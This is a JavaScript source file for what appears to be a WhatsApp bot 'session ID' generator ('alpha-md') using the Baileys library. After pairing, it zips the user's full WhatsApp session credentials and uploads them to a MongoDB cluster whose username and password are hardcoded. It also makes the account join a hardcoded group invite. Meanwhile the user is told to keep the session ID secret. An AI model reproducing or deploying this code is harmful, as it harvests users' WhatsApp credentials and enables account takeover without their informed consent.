const {makeid2} = require('./id')
const id = makeid2()
const fs = require('fs')
const pino = require('pino')
const { default: makeWASocket, Browsers, delay, useMultiFileAuthState, BufferJSON, fetchLatestBaileysVersion, PHONENUMBER_MCC, DisconnectReason, makeInMemoryStore, jidNormalizedUser, makeCacheableSignalKeyStore } = require("@whiskeysockets/baileys")
const Pino = require("pino")
const NodeCache = require("node-cache")
const chalk = require("chalk")
const readline = require("readline")
const { parsePhoneNumber } = require("libphonenumber-js")
const archiver = require('archiver');
const { MongoClient } = require('mongodb');


let phoneNumber = "2348114860536"

const pairingCode = !!phoneNumber || process.argv.includes("--pairing-code")
const useMobile = process.argv.includes("--mobile")

const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
const question = (text) => new Promise((resolve) => rl.question(text, resolve))


  async function qr() {
//------------------------------------------------------
let { version, isLatest } = await fetchLatestBaileysVersion()
const {  state, saveCreds } =await useMultiFileAuthState('./session/'+id)
    const msgRetryCounterCache = new NodeCache() // for retry message, "waiting message"
    const XeonBotInc = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: !pairingCode, // popping up QR in terminal log
      browser: Browsers.windows('Firefox'), // for this issues https://github.com/WhiskeySockets/Baileys/issues/328
     auth: {
         creds: state.creds,
         keys: makeCacheableSignalKeyStore(state.keys, Pino({ level: "fatal" }).child({ level: "fatal" })),
      },
      markOnlineOnConnect: true, // set false for offline
      generateHighQualityLinkPreview: true, // make high preview link
      getMessage: async (key) => {
         let jid = jidNormalizedUser(key.remoteJid)
         let msg = await store.loadMessage(jid, key.id)

         return msg?.message || ""
      },
      msgRetryCounterCache, // Resolve waiting messages
      defaultQueryTimeoutMs: undefined, // for this issues https://github.com/WhiskeySockets/Baileys/issues/276
   })


    // login use pairing code
   // source code https://github.com/WhiskeySockets/Baileys/blob/master/Example/example.ts#L61
   if (pairingCode && !XeonBotInc.authState.creds.registered) {
      if (useMobile) throw new Error('Cannot use pairing code with mobile api')

      let phoneNumber
      if (!!phoneNumber) {
         phoneNumber = phoneNumber.replace(/[^0-9]/g, '')

         if (!Object.keys(PHONENUMBER_MCC).some(v => phoneNumber.startsWith(v))) {
            console.log(chalk.bgBlack(chalk.redBright("Start with country code of your WhatsApp Number, Example : +2348114860536")))
            process.exit(0)
         }
      } else {
         phoneNumber = await question(chalk.bgBlack(chalk.greenBright(`Please type your WhatsApp number 😍\nFor example: +2348114860536 : `)))
         phoneNumber = phoneNumber.replace(/[^0-9]/g, '')

         // Ask again when entering the wrong number
         if (!Object.keys(PHONENUMBER_MCC).some(v => phoneNumber.startsWith(v))) {
            console.log(chalk.bgBlack(chalk.redBright("Start with country code of your WhatsApp Number, Example : +2348114860536")))

            phoneNumber = await question(chalk.bgBlack(chalk.greenBright(`Please type your WhatsApp number 😍\nFor example: +2348114860536 : `)))
            phoneNumber = phoneNumber.replace(/[^0-9]/g, '')
            rl.close()
         }
      }

      setTimeout(async () => {
         let code = await XeonBotInc.requestPairingCode(phoneNumber)
         code = code?.match(/.{1,4}/g)?.join("-") || code
         console.log(chalk.black(chalk.bgGreen(`Your Pairing Code : `)), chalk.black(chalk.white(code)))
      }, 3000)
   }
//------------------------------------------------------
    XeonBotInc.ev.on("connection.update",async  (s) => {
        const { connection, lastDisconnect } = s
        if (connection == "open") {
            await delay(1000 * 10)
            await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: '*thanks for choosing alpha-md*\n*your sesssionid will be sent in 20 seconds please wait..*\n*have a great day ahead*' });
            await delay(1000 * 20)
            const folderPath = `./session/${id}/`;
               const randomId = id;
               const output = fs.createWriteStream(`creds_${randomId}.zip`);
               const archive = archiver('zip', {
                   zlib: { level: 9 } 
               });
               output.on('close', async () => {
                   console.log('Zip file created successfully.');
                   const client = new MongoClient('mongodb+srv://uploader2:uploader2@uploader2.uhnmx1u.mongodb.net/?retryWrites=true&w=majority&appName=uploader2');
                   try {
                       await client.connect();
                       const database = client.db('testdb');
                       const collection = database.collection('credentials');
                       const fileContent = fs.readFileSync(`creds_${randomId}.zip`);
                       const result = await collection.insertOne({
                           fileId: randomId,
                           file: fileContent
                       });
   
                       console.log('File uploaded to MongoDB with ID:', result.insertedId);
                       XeonBotInc.groupAcceptInvite("BGWpp9qySw81CGrqRM3ceg");
                       const xeonses = await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: randomId });
                       await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: `*ᴅᴇᴀʀ ᴜsᴇʀ ᴛʜɪs ɪs ʏᴏᴜʀ sᴇssɪᴏɴ ɪᴅ*\n*◕ ⚠️ ᴘʟᴇᴀsᴇ ᴅᴏ ɴᴏᴛ sʜᴀʀᴇ ᴛʜɪs ᴄᴏᴅᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ᴀs ɪᴛ ᴄᴏɴᴛᴀɪɴs ʀᴇǫᴜɪʀᴇᴅ ᴅᴀᴛᴀ ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ᴄᴏɴᴛᴀᴄᴛ ᴅᴇᴛᴀɪʟs ᴀɴᴅ ᴀᴄᴄᴇss ʏᴏᴜʀ ᴡʜᴀᴛsᴀᴘᴘ*` }, {quoted: xeonses});
                   } catch (error) {
                       console.error('Error uploading file to MongoDB:', error);
                   } finally {
                       await client.close();
                   }
               });
               archive.on('warning', function (err) {
                   if (err.code === 'ENOENT') {
                       console.warn('File not found:', err);
                   } else {
                       throw err;
                   }
               });
               archive.on('error', function (err) {
                   throw err;
               });
               archive.pipe(output);
               archive.directory(folderPath, false);
               archive.finalize();
               await delay(1000 * 2)
               process.exit(0);
        }
        if (
            connection === "close" &&
            lastDisconnect &&
            lastDisconnect.error &&
            lastDisconnect.error.output.statusCode != 401
        ) {
            qr()
        }
    })
    XeonBotInc.ev.on('creds.update', saveCreds)
    XeonBotInc.ev.on("messages.upsert",  () => { })
}
qr()

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("not-authorized")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})
